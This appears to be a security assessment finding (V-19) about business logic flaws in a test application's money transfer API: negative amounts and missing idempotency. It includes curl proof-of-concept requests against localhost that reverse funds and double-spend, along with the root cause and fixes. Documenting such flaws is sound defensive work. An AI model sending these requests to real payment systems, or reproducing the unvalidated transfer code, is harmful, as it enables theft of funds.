# V-19 — Business Logic Flaws in Transfers

| Field | Value |
|---|---|
| **Severity** | Critical (CVSS 8.1) |
| **CWE** | CWE-840 — Business Logic Errors |
| **Endpoint** | `POST /api/v1/transfers` |
| **Component** | `target-app/src/money/transfers.js` |
| **Status** | Confirmed exploitable |

## Summary
The transfer creation endpoint suffers from two severe business logic flaws:
1. Negative Amounts: The API accepts negative amount_cents values. In a double-entry ledger, this reverses the flow of funds, effectively stealing money from the destination account.
2. No Idempotency: The API accepts duplicate requests. A double-click or network retry creates multiple distinct transfers for the same intent, resulting in double-spending.

## Evidence
1. Negative amount transfer:
   curl -s -X POST localhost:3000/api/v1/transfers -H "Authorization: Bearer $TOKEN_A" -H 'content-type: application/json' -d '{"from_account_id":"a0000001-0000-4000-8000-000000000201","to_account_id":"a0000001-0000-4000-8000-000000000202","amount_cents":-50000}'
   Response is 201 Created. (Reverses the ledger).

2. Double-spend via duplicate requests (fired twice with the same Idempotency-Key header):
   curl -s -X POST localhost:3000/api/v1/transfers -H "Authorization: Bearer $TOKEN_A" -H "Idempotency-Key: req-123" -H 'content-type: application/json' -d '{"from_account_id":"a0000001-0000-4000-8000-000000000201","to_account_id":"a0000001-0000-4000-8000-000000000202","amount_cents":100000}' | jq .transfer.id
   Response is two different UUIDs. Database shows two distinct 100000 cent transfers.

## Root Cause
The money/transfers.js file lacks validation and idempotency checks:
async function createTransfer(req, fromAccountId, toAccountId, amountCents) {
  // No idempotency check, no amount validation
  await client.query(`INSERT INTO transfers (...) VALUES (...)`, [...]);
}

## Fix
1. Add a DB constraint: CHECK (amount_cents > 0).
2. Add an idempotency_key column with a UNIQUE constraint. The API must require the Idempotency-Key header and return the existing transfer if the key is reused.
3. Use SELECT ... FOR UPDATE on the accounts to lock balances during transfer execution (prevents concurrent race conditions).
